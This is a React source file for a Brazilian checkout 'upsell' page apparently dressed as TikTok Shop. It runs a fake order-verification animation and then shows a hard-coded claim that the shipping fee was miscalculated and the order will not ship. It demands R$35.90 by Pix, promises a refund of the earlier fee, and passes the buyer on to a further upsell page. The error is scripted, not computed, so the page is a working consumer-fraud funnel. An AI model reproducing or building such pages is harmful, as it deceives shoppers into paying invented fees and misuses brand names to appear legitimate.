import { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { X, Check, AlertTriangle } from "lucide-react";
import { toast } from "sonner";
import { Button } from "@/components/ui/button";
import { Progress } from "@/components/ui/progress";
import { PixPaymentModal } from "@/components/PixPaymentModal";
import { useParadisePix } from "@/hooks/useParadisePix";
import { useTrackingService } from "@/hooks/useTrackingService";
import { validateCustomerForPix } from "@/lib/paymentCustomer";
import tiktokLogo from "@/assets/upsell/tiktok-shop.png";
import slimhealthLogo from "@/assets/slimhealth-logo.png";
import cimedLogo from "@/assets/cimed-logo.png";

const UPSELL_AMOUNT = 35.90;
const UPSELL_DESCRIPTION = "Correção de Frete";

const Upsell3Page = () => {
  const navigate = useNavigate();
  const card3Ref = useRef<HTMLDivElement>(null);

  useTrackingService();

  const [phase, setPhase] = useState<'verification' | 'cards'>('verification');
  const [progress, setProgress] = useState(0);
  const [statusText, setStatusText] = useState('Processando...');

  const [visibleCards, setVisibleCards] = useState({
    card1: false,
    card2: false,
    card3: false,
  });

  const [showModal, setShowModal] = useState(false);

  const {
    isLoading,
    error,
    qrCode,
    qrCodeBase64,
    paymentStatus,
    createPixPaymentWithTracking,
    startPolling,
    stopPolling,
    reset,
  } = useParadisePix();

  // Redirect on approved
  useEffect(() => {
    if (paymentStatus === 'approved') {
      toast.success("Pagamento confirmado!");
      setShowModal(false);
      navigate('/upsell4');
    }
  }, [paymentStatus, navigate]);

  // Verification phase animation
  useEffect(() => {
    if (phase !== 'verification') return;

    const progressInterval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) { clearInterval(progressInterval); return 100; }
        return prev + 3;
      });
    }, 100);

    const timer1 = setTimeout(() => setStatusText('Verificando dados...'), 1000);
    const timer2 = setTimeout(() => setStatusText('Quase pronto...'), 2000);
    const timer3 = setTimeout(() => setStatusText('Concluído!'), 2800);
    const phaseTimer = setTimeout(() => setPhase('cards'), 3500);

    return () => {
      clearInterval(progressInterval);
      clearTimeout(timer1);
      clearTimeout(timer2);
      clearTimeout(timer3);
      clearTimeout(phaseTimer);
    };
  }, [phase]);

  // Cards sequential appearance
  useEffect(() => {
    if (phase !== 'cards') return;

    const t1 = setTimeout(() => setVisibleCards(prev => ({ ...prev, card1: true })), 100);
    const t2 = setTimeout(() => setVisibleCards(prev => ({ ...prev, card2: true })), 2000);
    const t3 = setTimeout(() => {
      setVisibleCards(prev => ({ ...prev, card3: true }));
      setTimeout(() => card3Ref.current?.scrollIntoView({ behavior: 'smooth', block: 'center' }), 300);
    }, 4000);

    return () => { clearTimeout(t1); clearTimeout(t2); clearTimeout(t3); };
  }, [phase]);

  const handleOpenModal = async () => {
    if (isLoading) return; // prevent double-click

    const dadosSalvos = localStorage.getItem('dadosPessoais');
    if (!dadosSalvos) {
      toast.error("Dados pessoais não encontrados. Volte e preencha seus dados.", { duration: 5000 });
      return;
    }

    let parsed: Record<string, string>;
    try { parsed = JSON.parse(dadosSalvos); } catch {
      toast.error("Dados pessoais corrompidos. Volte e preencha seus dados novamente.");
      return;
    }

    const validation = validateCustomerForPix(parsed);
    if (!validation.valid) {
      toast.error(validation.errors[0], { duration: 5000 });
      return;
    }

    setShowModal(true);

    const success = await createPixPaymentWithTracking(
      UPSELL_AMOUNT,
      UPSELL_DESCRIPTION,
      validation.customer,
      `upsell3_${Date.now()}`,
      'Correção de Frete',
      'upsell3'
    );

    if (success) {
      startPolling(() => {
        toast.success("Pagamento confirmado!");
        setShowModal(false);
        navigate('/upsell4');
      });
    }
  };

  const handleCloseModal = () => {
    setShowModal(false);
  };

  const handleRetry = () => {
    reset();
    handleOpenModal();
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header */}
      <div className="bg-white px-4 py-4 flex justify-center">
        <img src={tiktokLogo} alt="TikTok Shop" className="h-10 w-auto" />
      </div>

      {/* Verification Phase */}
      {phase === 'verification' && (
        <div className="flex-1 flex flex-col items-center justify-center p-6">
          <div className="w-full max-w-md text-center space-y-6">
            <div className="flex justify-center">
              <div className="w-20 h-20 rounded-full flex items-center justify-center bg-gradient-to-br from-rose-400 to-rose-600 shadow-[0_8px_24px_rgba(244,63,94,0.4)] animate-pulse">
                <Check className="w-10 h-10 text-white" />
              </div>
            </div>
            <div>
              <h1 className="text-2xl font-extrabold text-[#1a1a2e] mb-2">Seu pedido foi concluído!</h1>
              <p className="text-gray-600">Aguarde enquanto realizamos a verificação do pedido...</p>
            </div>
            <div className="space-y-2">
              <Progress value={progress} className="h-3 bg-rose-100" />
              <p className="text-sm text-gray-500 font-medium">{statusText}</p>
            </div>
          </div>
        </div>
      )}

      {/* Cards Phase */}
      {phase === 'cards' && (
        <div className="flex-1 flex flex-col items-center p-4">
          <div className="w-full max-w-md space-y-4">
            {visibleCards.card1 && (
              <div className="bg-white rounded-2xl shadow-lg p-6 animate-card-slide-up">
                <div className="flex items-start gap-4">
                  <div className="w-14 h-14 rounded-full flex items-center justify-center flex-shrink-0 bg-gradient-to-br from-emerald-400 to-emerald-600 shadow-[0_4px_12px_rgba(16,185,129,0.4)]">
                    <Check className="w-7 h-7 text-white" />
                  </div>
                  <div className="flex-1">
                    <h2 className="font-bold text-[#1a1a2e] text-lg">Pedido Concluído com Sucesso</h2>
                    <p className="text-sm text-gray-500 mt-1">Aguarde um momento...</p>
                  </div>
                </div>
              </div>
            )}

            {visibleCards.card2 && (
              <div className="bg-white rounded-2xl shadow-lg p-6 animate-card-slide-up">
                <div className="flex items-start gap-4">
                  <div className="w-14 h-14 rounded-full flex items-center justify-center flex-shrink-0 bg-gradient-to-br from-amber-400 to-amber-500 shadow-[0_4px_12px_rgba(245,158,11,0.4)]">
                    <AlertTriangle className="w-7 h-7 text-white" />
                  </div>
                  <div className="flex-1">
                    <h2 className="font-bold text-[#1a1a2e] text-lg">Validação do CEP para Entrega</h2>
                    <p className="text-sm text-gray-500 mt-1">Estamos verificando as informações...</p>
                  </div>
                </div>
              </div>
            )}

            {visibleCards.card3 && (
              <div ref={card3Ref} className="bg-white rounded-2xl shadow-lg p-6 border-2 border-rose-500 animate-card-slide-up">
                <div className="flex items-start gap-4">
                  <div className="w-14 h-14 rounded-full flex items-center justify-center flex-shrink-0 bg-gradient-to-br from-rose-500 to-rose-600 shadow-[0_4px_12px_rgba(244,63,94,0.4)]">
                    <X className="w-7 h-7 text-white" />
                  </div>
                  <div className="flex-1">
                    <h2 className="font-bold text-[#1a1a2e] text-lg">O valor do Frete foi calculado errado para sua região</h2>
                    <p className="text-sm text-gray-500 mt-1">O pedido não será enviado. Faça a correção do frete para finalizar.</p>
                  </div>
                </div>
                <Button
                  onClick={handleOpenModal}
                  disabled={isLoading}
                  className="w-full mt-4 bg-gradient-to-r from-rose-500 to-rose-600 hover:from-rose-600 hover:to-rose-700 text-white font-bold py-4 rounded-xl shadow-lg text-lg h-auto"
                >
                  {isLoading ? 'PROCESSANDO...' : 'PAGAR FRETE - R$ 35,90'}
                </Button>
                <div className="mt-4 bg-rose-50 rounded-lg p-3 text-center">
                  <p className="text-sm text-rose-600 font-medium">O valor pago do frete anterior será reembolsado</p>
                </div>
              </div>
            )}

            {visibleCards.card3 && (
              <div className="flex items-center justify-center gap-3 mt-6 mb-8 animate-card-slide-up">
                <img src={slimhealthLogo} alt="SlimHealth" className="h-7 object-contain opacity-70" />
                <span className="text-lg font-bold text-muted-foreground">+</span>
                <img src={cimedLogo} alt="CIMED" className="h-5 object-contain opacity-70" />
              </div>
            )}
          </div>
        </div>
      )}

      <PixPaymentModal
        isOpen={showModal}
        onClose={handleCloseModal}
        title="Correção de Frete"
        amount={UPSELL_AMOUNT}
        qrCode={qrCode}
        qrCodeBase64={qrCodeBase64}
        isLoading={isLoading}
        paymentStatus={paymentStatus}
        error={error}
        onRetry={handleRetry}
      />
    </div>
  );
};

export default Upsell3Page;
